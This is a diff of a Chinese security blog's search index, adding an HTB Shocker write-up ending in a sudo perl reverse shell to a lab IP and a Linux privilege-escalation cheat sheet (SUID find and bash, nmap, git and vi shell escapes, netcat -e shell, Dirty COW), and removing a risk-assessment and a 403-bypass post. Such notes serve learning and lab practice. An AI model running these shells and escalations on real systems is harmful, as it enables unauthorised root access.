+<h4 id="sudo-perl-反连"><a href="#sudo-perl-反连" class="headerlink" title="sudo  perl  反连"></a>sudo  perl  反连</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.14.33&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/03/HTB-Shocker/7.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/8.png" class>
+
+<p>OR</p>
+<img src="/2021/02/03/HTB-Shocker/9.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/10.png" class>]]></content>
+      <categories>
+        <category>安全实验</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Linux 提权小结</title>
+    <url>/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期对Linux提权颇感兴趣，经拜读相关文章，个人过点实操，权当记录~</em></strong></p>
+<h2 id="0x01-SUID提权："><a href="#0x01-SUID提权：" class="headerlink" title="0x01 SUID提权："></a><strong><em>0x01 SUID提权：</em></strong></h2><p><strong><em>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</em></strong></p>
+<p><strong><em>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<h3 id="例1、find"><a href="#例1、find" class="headerlink" title="例1、find"></a><strong>例1、find</strong></h3><p><strong><em>假如find命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec whoami \;</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/1.png" class>
+
+<p><strong><em>也有另外一种姿势</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">touch 2333</span><br><span class="line">find 2333 -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/2.png" class>
+
+<p><strong><em>当然也可以执行反弹shell</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find 2333 -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/3.png" class>
+
+<h3 id="例2、bash"><a href="#例2、bash" class="headerlink" title="例2、bash"></a><strong>例2、bash</strong></h3><p><strong><em>假如bash命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/4.png" class>
+
+<h2 id="0x02-Nmap提权："><a href="#0x02-Nmap提权：" class="headerlink" title="0x02 Nmap提权："></a><strong><em>0x02 Nmap提权：</em></strong></h2><p><strong><em>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/5.png" class>
+
+<h2 id="0x03-Git提权："><a href="#0x03-Git提权：" class="headerlink" title="0x03 Git提权："></a><strong><em>0x03 Git提权：</em></strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">	!&#39;sh&#39;</span><br><span class="line">	或者</span><br><span class="line">sudo git  -p help</span><br><span class="line">	!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/6.png" class>
+
+<h2 id="0x04-绕过rbash："><a href="#0x04-绕过rbash：" class="headerlink" title="0x04 绕过rbash："></a><strong><em>0x04 绕过rbash：</em></strong></h2><p><strong><em>绕过 rbash , 主要取决于 rbash user 所被允许执行的命令. 通常是利用软件执行外部命令来绕过 rbash. 常见情形的有 vim 、vi、more、less、python 调用 os.system 等. 实际上就是换一个形式调出 bash.</em></strong> </p>
+<h3 id="例1、vi、vim、more、less"><a href="#例1、vi、vim、more、less" class="headerlink" title="例1、vi、vim、more、less"></a><strong>例1、vi、vim、more、less</strong></h3><p><strong><em>如下图所示，原本rbash不允许使用cd命令，通过vi命令强行调出bash绕过</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi 1 </span><br><span class="line">!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/7.png" class>
+
+<p><strong><em>vim、less、和more命令也类似，直接发图</em></strong></p>
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/8.png" class>
+
+<h3 id="例2、python"><a href="#例2、python" class="headerlink" title="例2、python"></a><strong>例2、python</strong></h3><p><strong><em>若有python权限，则可以尝试调用os模块去绕</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/9.png" class>
+
+<h2 id="0x05-内核提权："><a href="#0x05-内核提权：" class="headerlink" title="0x05 内核提权："></a><em>0x05 内核提权：</em></h2><p><strong><em>这块没啥好说的，就是干。。就稍讲笔者所知的两种套路</em></strong></p>
+<h3 id="1、针对系统版本"><a href="#1、针对系统版本" class="headerlink" title="1、针对系统版本"></a><strong>1、针对系统版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、使用lsb_release -a 查看系统版本</span><br><span class="line">2、在kali上使用searchsploit -t 系统版本</span><br><span class="line">3、使用gcc编译后，授权直接跑</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/10.png" class>
+
+<h3 id="2、针对内核版本"><a href="#2、针对内核版本" class="headerlink" title="2、针对内核版本"></a><strong>2、针对内核版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用Dirty COW漏洞，需要Linux内核&gt;&#x3D;2.6.22，</span><br><span class="line">exp:https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;dirtyc0w.c</span><br><span class="line">比较出名，自行百度</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>安全技巧</category>
+      </categories>
+  </entry>
+  <entry>
     <title>SDLC学习笔记</title>
     <url>/2020/09/16/SDLC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p><em>近期对SDL感兴趣，本篇内容大部分基于相关资料，权当学习笔记。</em></p>
@@ -296,24 +548,16 @@
       </categories>
   </entry>
   <entry>
-    <title>风险评估的一般套路~</title>
-    <url>/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>​     <strong><em>风险评估是组织用于确定信息安全需求的重要方法，建设信息安全管理体系的必要途径，是作为信息安全管理者的必备能力， 希望对大家了解或实施有所帮助~</em></strong></p>
-<h2 id="0x01-风险评估是啥？"><a href="#0x01-风险评估是啥？" class="headerlink" title="0x01 风险评估是啥？"></a><strong><em>0x01 风险评估是啥？</em></strong></h2><p>​     <strong><em>信息安全风险评估是指依据有关信息安全技术与管理标准，对信息资产识别、威胁识别、脆弱性识别、风险值的计算，评估资产面临的威胁以及威胁利用脆弱性导致安全事件的可能性，并结合安全事件所涉及的资产价值来判断安全事件一旦发生对组织造成的影响。</em></strong></p>
-<h2 id="0x02-基本术语了解"><a href="#0x02-基本术语了解" class="headerlink" title="0x02 基本术语了解"></a><strong><em>0x02 基本术语了解</em></strong></h2><p>​      <strong><em>风评的术语不少，像ARO(年发生率)、SLE（单一损失期望）、EF（暴露因子）之类比较玄的概念， 本次不展开讲。就只讲以下几个本人觉得比较核心的~</em></strong></p>
-<p><strong><em>1、资产价值：顾名思义，可以用金额或发生事件会造成的影响来衡量价值。</em></strong></p>
-<p><strong><em>2、威胁：特定场景中，可能导致的事件。</em></strong></p>
-<p><strong><em>3、脆弱性：漏洞或弱点，即资产或资产组中存在的可被威胁利用的弱点，弱点一旦被利用可能会对资产造成损害。</em></strong></p>
-<p><strong><em>4、风险：特定威胁利用资产弱点给资产或资产组带来损害的可能性。(一般风险计算公式 : 资产价值 x 威胁 x 脆弱性  = 风险)</em></strong></p>
-<p>​    <strong><em>威胁、脆弱性、风险三者的关系如下图所示：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></em></strong></p>
-<h2 id="0x03-风险分析方法"><a href="#0x03-风险分析方法" class="headerlink" title="0x03  风险分析方法"></a><strong><em>0x03  风险分析方法</em></strong></h2><p>​     <strong><em>风险分析具有定量和定性两种方法：</em></strong></p>
-<p><strong><em>1、定性分析，更多以观点和场景为基础，使用评级的方式来评定风险的关键级别。</em></strong></p>
-<p><strong><em>2、定量分析，会尝试为风险分析过程所有元素都赋值，每个元素（资产价值、威胁评率、脆弱性的严重程度、损失影响、防护成本、防护有效性等）都被量化输入公式，然后计算出总风险和剩余风险。</em></strong> </p>
-<p>​      <strong><em>两者特征如下图：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></em></strong></p>
-<p>​     <strong><em>简单来说定性比较主观，根据实施人员的经验，判断出风险的高中低（类似于国内的等保测评），但优点在于较容易实施开展；相对的定量分析则由于需要一定的风评辅助工具，且正统的定量分析以发生事件产生的金额损失为结果表现，实施须涉及资产估值（据个人BCS安全大会了解，国内暂无资产估值的标准，正在做），实施难度较大。总的来说两种方法各有优缺点，分别适用于特定的场合。</em></strong></p>
-<h2 id="0x04-一般实施思路"><a href="#0x04-一般实施思路" class="headerlink" title="0x04 一般实施思路"></a><strong><em>0x04 一般实施思路</em></strong></h2><p>​    <strong><em>结合个人实际工作经验，大致实施思路分为以下几点：</em></strong></p>
-<p><strong><em>1、根据需求选取合适的标准，整理出合适CheckList</em></strong><br><strong><em>2、根据项目大小，选择合适的评估范围</em></strong><br><strong><em>3、收集脆弱点，结合威胁识别/计算出各项风险</em></strong><br><strong><em>4、汇总问题，构思报告表现</em></strong></p>
-<h2 id="0x05-一般报告结构"><a href="#0x05-一般报告结构" class="headerlink" title="0x05 一般报告结构"></a><strong><em>0x05 一般报告结构</em></strong></h2><p>​    <strong><em>报告结构这块弹性较大，需结合实际项目，但一般结构包含下图所示几点：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/3.png" class></em></strong></p>
+    <title>蓝队项目经理一般套路</title>
+    <url>/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>   <strong><em>近期参与了几个攻防演练，想趁热打铁记点东西~</em></strong></p>
+<h2 id="0x01-基本了解"><a href="#0x01-基本了解" class="headerlink" title="0x01 基本了解"></a><strong><em>0x01 基本了解</em></strong></h2><p><strong><em>蓝队以参演单位现有防护运营体系为基础， 应对实战攻防组建一支防守队伍。主要负责前期安全、 检查、整改与加固，演练期间网络安全监测、预警、 分析、验证、处置，后期复盘总结现有防护工作中不 足之处，为后期常态化防护工作提供优化依据。</em></strong></p>
+<h2 id="0x02-常规角色与分工情况"><a href="#0x02-常规角色与分工情况" class="headerlink" title="0x02  常规角色与分工情况"></a><strong><em>0x02  常规角色与分工情况</em></strong></h2><p><strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></strong></p>
+<h2 id="0x03-一般实施思路"><a href="#0x03-一般实施思路" class="headerlink" title="0x03 一般实施思路"></a><strong><em>0x03 一般实施思路</em></strong></h2><p> <strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></strong></p>
+<h2 id="0x04-一些体会"><a href="#0x04-一些体会" class="headerlink" title="0x04 一些体会"></a><strong><em>0x04 一些体会</em></strong></h2><p><strong><em>上面讲了一些介绍，提了点思路，下面讲下体会~</em></strong></p>
+<p><strong><em>1、对外暴露资产及弱口令的梳理非常关键。</em></strong></p>
+<p><strong><em>2、监测设备能不能”打”很关键。</em></strong></p>
+<p><strong><em>3、多做能向客户体现价值的活（汇报、提建议），脏活累活给友商~~</em></strong></p>
 ]]></content>
       <categories>
         <category>技战法</category>
@@ -355,271 +599,27 @@
       </categories>
   </entry>
   <entry>
-    <title>Linux 提权小结</title>
-    <url>/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期对Linux提权颇感兴趣，经拜读相关文章，个人过点实操，权当记录~</em></strong></p>
-<h2 id="0x01-SUID提权："><a href="#0x01-SUID提权：" class="headerlink" title="0x01 SUID提权："></a><strong><em>0x01 SUID提权：</em></strong></h2><p><strong><em>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</em></strong></p>
-<p><strong><em>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
-
-<h3 id="例1、find"><a href="#例1、find" class="headerlink" title="例1、find"></a><strong>例1、find</strong></h3><p><strong><em>假如find命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec whoami \;</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/1.png" class>
-
-<p><strong><em>也有另外一种姿势</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">touch 2333</span><br><span class="line">find 2333 -exec whoami \;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/2.png" class>
-
-<p><strong><em>当然也可以执行反弹shell</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find 2333 -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/3.png" class>
-
-<h3 id="例2、bash"><a href="#例2、bash" class="headerlink" title="例2、bash"></a><strong>例2、bash</strong></h3><p><strong><em>假如bash命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/4.png" class>
-
-<h2 id="0x02-Nmap提权："><a href="#0x02-Nmap提权：" class="headerlink" title="0x02 Nmap提权："></a><strong><em>0x02 Nmap提权：</em></strong></h2><p><strong><em>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/5.png" class>
-
-<h2 id="0x03-Git提权："><a href="#0x03-Git提权：" class="headerlink" title="0x03 Git提权："></a><strong><em>0x03 Git提权：</em></strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">	!&#39;sh&#39;</span><br><span class="line">	或者</span><br><span class="line">sudo git  -p help</span><br><span class="line">	!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/6.png" class>
-
-<h2 id="0x04-绕过rbash："><a href="#0x04-绕过rbash：" class="headerlink" title="0x04 绕过rbash："></a><strong><em>0x04 绕过rbash：</em></strong></h2><p><strong><em>绕过 rbash , 主要取决于 rbash user 所被允许执行的命令. 通常是利用软件执行外部命令来绕过 rbash. 常见情形的有 vim 、vi、more、less、python 调用 os.system 等. 实际上就是换一个形式调出 bash.</em></strong> </p>
-<h3 id="例1、vi、vim、more、less"><a href="#例1、vi、vim、more、less" class="headerlink" title="例1、vi、vim、more、less"></a><strong>例1、vi、vim、more、less</strong></h3><p><strong><em>如下图所示，原本rbash不允许使用cd命令，通过vi命令强行调出bash绕过</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi 1 </span><br><span class="line">!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/7.png" class>
-
-<p><strong><em>vim、less、和more命令也类似，直接发图</em></strong></p>
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/8.png" class>
-
-<h3 id="例2、python"><a href="#例2、python" class="headerlink" title="例2、python"></a><strong>例2、python</strong></h3><p><strong><em>若有python权限，则可以尝试调用os模块去绕</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/9.png" class>
-
-<h2 id="0x05-内核提权："><a href="#0x05-内核提权：" class="headerlink" title="0x05 内核提权："></a><em>0x05 内核提权：</em></h2><p><strong><em>这块没啥好说的，就是干。。就稍讲笔者所知的两种套路</em></strong></p>
-<h3 id="1、针对系统版本"><a href="#1、针对系统版本" class="headerlink" title="1、针对系统版本"></a><strong>1、针对系统版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、使用lsb_release -a 查看系统版本</span><br><span class="line">2、在kali上使用searchsploit -t 系统版本</span><br><span class="line">3、使用gcc编译后，授权直接跑</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/10.png" class>
-
-<h3 id="2、针对内核版本"><a href="#2、针对内核版本" class="headerlink" title="2、针对内核版本"></a><strong>2、针对内核版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用Dirty COW漏洞，需要Linux内核&gt;&#x3D;2.6.22，</span><br><span class="line">exp:https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;dirtyc0w.c</span><br><span class="line">比较出名，自行百度</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>安全技巧</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>403绕过小结</title>
-    <url>/2021/01/17/403%E7%BB%95%E8%BF%87%E5%B0%8F%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期浏览到关于403绕过的技巧文章（<a href="https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ%EF%BC%89">https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ）</a></em></strong></p>
-<p><strong><em>饶有兴致，稍作小结，权当记录~</em></strong></p>
-<h2 id="0x01-改变请求方式："><a href="#0x01-改变请求方式：" class="headerlink" title="0x01 改变请求方式："></a><strong><em>0x01 改变请求方式：</em></strong></h2><h3 id="1、覆盖请求URL"><a href="#1、覆盖请求URL" class="headerlink" title="1、覆盖请求URL"></a><strong><em>1、覆盖请求URL</em></strong></h3><p><strong><em>尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制，通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。</em></strong></p>
-<p><strong><em>示例：</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 403 Forbidden</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Original-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br><span class="line">	</span><br><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Rewrite-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、修改拓展名"><a href="#2、修改拓展名" class="headerlink" title="2、修改拓展名"></a><strong><em>2、修改拓展名</em></strong></h3><p><strong><em>基于扩展名，用于绕过403受限制的目录</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site.com&#x2F;admin &#x3D;&gt; 403</span><br><span class="line">site.com&#x2F;admin&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;* &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;*&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;.&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin?? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin??? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2f&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2e&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%20&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%09&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%20admin%20&#x2F; &#x3D;&gt; 200</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-改变请求内容："><a href="#0x02-改变请求内容：" class="headerlink" title="0x02 改变请求内容："></a><strong><em>0x02 改变请求内容：</em></strong></h2><h3 id="1、修改-添加-Referer或HOST头"><a href="#1、修改-添加-Referer或HOST头" class="headerlink" title="1、修改/添加 Referer或HOST头"></a><strong><em>1、修改/添加 Referer或HOST头</em></strong></h3><p><strong><em>若服务器之间的业务访问控制是通过Referer或HOST头去关联，则可以尝试修改/添加 Referer 或HOST头去绕</em></strong>~</p>
-<p><strong><em>示例：</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、添加代理IP"><a href="#2、添加代理IP" class="headerlink" title="2、添加代理IP"></a><strong><em>2、添加代理IP</em></strong></h3><p><strong><em>若应用是通过代理识别访问端IP限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制~</em></strong></p>
